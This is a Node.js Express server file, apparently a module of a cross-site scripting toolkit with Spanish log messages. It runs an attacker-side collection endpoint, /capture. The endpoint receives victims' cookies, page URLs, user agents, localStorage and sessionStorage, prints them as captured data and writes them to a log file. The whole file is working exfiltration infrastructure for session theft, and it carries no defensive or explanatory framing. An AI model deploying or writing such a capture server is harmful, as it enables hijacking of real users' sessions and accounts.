// modules/xss_server/server.js
const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const app = express();
const port = 3000;

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static('public'));

app.post('/capture', (req, res) => {
    const capturedData = {
        timestamp: new Date().toISOString(),
        cookie: req.body.cookie || 'No cookie',
        url: req.body.url || 'No URL',
        userAgent: req.body.userAgent || 'No UA',
        localStorage: req.body.localStorage || 'No localStorage',
        sessionStorage: req.body.sessionStorage || 'No sessionStorage'
    };
    console.log(`[!] Datos capturados: ${JSON.stringify(capturedData, null, 2)}`);
    fs.appendFileSync('output/capture.log', JSON.stringify(capturedData) + '\n');
    res.send('Datos capturados');
});

app.listen(port, () => {
    console.log(`[!] Servidor XSS activo en http://localhost:${port}`);
});
